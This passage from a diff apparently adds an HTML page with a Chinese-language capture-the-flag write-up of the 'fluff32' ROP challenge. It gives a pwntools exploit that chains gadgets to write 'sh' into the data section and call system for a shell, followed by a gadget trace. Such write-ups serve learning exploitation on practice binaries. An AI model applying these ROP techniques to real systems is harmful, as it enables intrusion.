+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_esi_xor_edx_ebx_pop_ebp_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>
+
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">xchg_edx_ecx_pop_ebp_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>
+
+<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">pidof</span><span class="p">(</span><span class="n">p</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+</div>
+<p><code class="docutils literal notranslate"><span class="pre">gdb</span> <span class="pre">attach</span></code> 上去看一下 <code class="docutils literal notranslate"><span class="pre">ecx</span></code> 的置有没有成功设置</p>
+<p><img alt="image-20200503191912942" src="../_images/image-20200503191912942.png" /></p>
+<p>可以看到，构造的 ROP 链成功设置了 ecx 的值为 data_section</p>
+<p>现在 开始写 设置 ebx 的那部分 payload</p>
+<p>现在的 edx 被污染了，需要清空，调用 <code class="docutils literal notranslate"><span class="pre">xor</span> <span class="pre">edx,edx</span></code> 就能清空 <code class="docutils literal notranslate"><span class="pre">edx</span></code>（自己和自己异或肯定等于 0 啊）</p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>   08048671 31 d2      XOR     EDX,EDX
+   08048673 5e         POP     ESI
+   08048674 bd be      MOV     EBP,0xcafebabe
+            ba fe ca
+   08048679 c3         RET
+</pre></div>
+</div>
+<p>这个可以，ok，写</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;tmux&quot;</span><span class="p">,</span> <span class="s2">&quot;split-window&quot;</span><span class="p">,</span> <span class="s2">&quot;-h&quot;</span><span class="p">]</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./fluff32&quot;</span><span class="p">)</span>
+<span class="n">fluff32</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./fluff32&quot;</span><span class="p">)</span>
+
+<span class="n">sh</span> <span class="o">=</span> <span class="s2">&quot;sh</span><span class="se">\x00\x00</span><span class="s2">&quot;</span>
+<span class="n">system_plt</span> <span class="o">=</span> <span class="n">fluff32</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">]</span>
+<span class="n">data_section</span> <span class="o">=</span> <span class="mh">0x0804a028</span>
+
+<span class="n">pop_ebx_ret</span> <span class="o">=</span> <span class="mh">0x080483e1</span>
+<span class="n">pop_edi_xor_edx_edx_pop_esi_ret</span> <span class="o">=</span> <span class="mh">0x08048670</span>
+<span class="n">pop_esi_xor_edx_ebx_pop_ebp_ret</span> <span class="o">=</span> <span class="mh">0x0804867a</span>
+<span class="n">xchg_edx_ecx_pop_ebp_ret</span> <span class="o">=</span> <span class="mh">0x08048689</span>
+<span class="n">pop_edi_write_ecx_men_pop_ebp_pop_ebx_xor_ecx_bl_ret</span> <span class="o">=</span> <span class="mh">0x08048692</span>
+
+<span class="n">xor_edx_ebx_pop_ebp_ret</span> <span class="o">=</span> <span class="mh">0x0804867b</span>
+
+
+<span class="n">exp</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mh">0x2c</span>
+
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">data_section</span><span class="p">)</span>
+
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_edi_xor_edx_edx_pop_esi_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>
+
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_esi_xor_edx_ebx_pop_ebp_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>
+
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">xchg_edx_ecx_pop_ebp_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>
+
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="p">(</span><span class="n">sh</span><span class="p">)</span>
+
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_edi_xor_edx_edx_pop_esi_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>
+
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">xor_edx_ebx_pop_ebp_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>
+
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_edi_write_ecx_men_pop_ebp_pop_ebx_xor_ecx_bl_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x00\x00\x00\x00</span><span class="s2">&quot;</span>
+
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_plt</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">data_section</span><span class="p">)</span>
+
+
+<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">pidof</span><span class="p">(</span><span class="n">p</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+</div>
+<p>ROP 汇编：</p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>   0x804864b &lt;pwnme+85&gt;                  ret    
+    ↓
+   0x80483e1 &lt;_init+33&gt;                  pop    ebx
+   0x80483e2 &lt;_init+34&gt;                  ret    
+    ↓
+   0x8048670 &lt;questionableGadgets&gt;       pop    edi
+   0x8048671 &lt;questionableGadgets+1&gt;     xor    edx, edx
+   0x8048673 &lt;questionableGadgets+3&gt;     pop    esi
+   0x8048674 &lt;questionableGadgets+4&gt;     mov    ebp, 0xcafebabe
+   0x8048679 &lt;questionableGadgets+9&gt;     ret    
+     ↓
+   0x804867a &lt;questionableGadgets+10&gt;    pop    esi
+   0x804867b &lt;questionableGadgets+11&gt;    xor    edx, ebx
+   0x804867d &lt;questionableGadgets+13&gt;    pop    ebp
+   0x804867e &lt;questionableGadgets+14&gt;    mov    edi, 0xdeadbabe
+   0x8048683 &lt;questionableGadgets+19&gt;    ret    
+    ↓
+   0x8048689 &lt;questionableGadgets+25&gt;    xchg   edx, ecx
+   0x804868b &lt;questionableGadgets+27&gt;    pop    ebp
+   0x804868c &lt;questionableGadgets+28&gt;    mov    edx, 0xdefaced0
+   0x8048691 &lt;questionableGadgets+33&gt;    ret    
+    ↓
+   0x80483e1 &lt;_init+33&gt;                  pop    ebx
+   0x80483e2 &lt;_init+34&gt;                  ret    
+    ↓
+   0x8048670 &lt;questionableGadgets&gt;       pop    edi
+   0x8048671 &lt;questionableGadgets+1&gt;     xor    edx, edx
+   0x8048673 &lt;questionableGadgets+3&gt;     pop    esi
+   0x8048674 &lt;questionableGadgets+4&gt;     mov    ebp, 0xcafebabe
+   0x8048679 &lt;questionableGadgets+9&gt;     ret    
+    ↓
+   0x804867b &lt;questionableGadgets+11&gt;    xor    edx, ebx
+   0x804867d &lt;questionableGadgets+13&gt;    pop    ebp
+   0x804867e &lt;questionableGadgets+14&gt;    mov    edi, 0xdeadbabe
+   0x8048683 &lt;questionableGadgets+19&gt;    ret    
+    ↓
+   0x8048692 &lt;questionableGadgets+34&gt;    pop    edi
+   0x8048693 &lt;questionableGadgets+35&gt;    mov    dword ptr [ecx], edx
+   0x8048693 &lt;questionableGadgets+35&gt;    mov    dword ptr [ecx], edx
+   0x8048695 &lt;questionableGadgets+37&gt;    pop    ebp
+   0x8048696 &lt;questionableGadgets+38&gt;    pop    ebx
+   0x8048697 &lt;questionableGadgets+39&gt;    xor    byte ptr [ecx], bl
+   0x8048699 &lt;questionableGadgets+41&gt;    ret    
+    ↓
+   0x8048430 &lt;system@plt&gt;                jmp    dword ptr [system@got.plt] &lt;0x804a018&gt;
+</pre></div>
+</div>
+<p>成功设置 <code class="docutils literal notranslate"><span class="pre">ecx</span></code> 和 <code class="docutils literal notranslate"><span class="pre">edx</span></code> 的值</p>
+<p><img alt="image-20200503203556821" src="../_images/image-20200503203556821.png" /></p>
+<p><img alt="image-20200503203739489" src="../_images/image-20200503203739489.png" /></p>
+<p>pwn!</p>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; 版权所有 2021, scriptk1d.</p>
+  </div>
+
+  利用 <a href="https://www.sphinx-doc.org/">Sphinx</a> 构建，使用了 
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">主题</a>
+    由 <a href="https://readthedocs.org">Read the Docs</a>开发.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
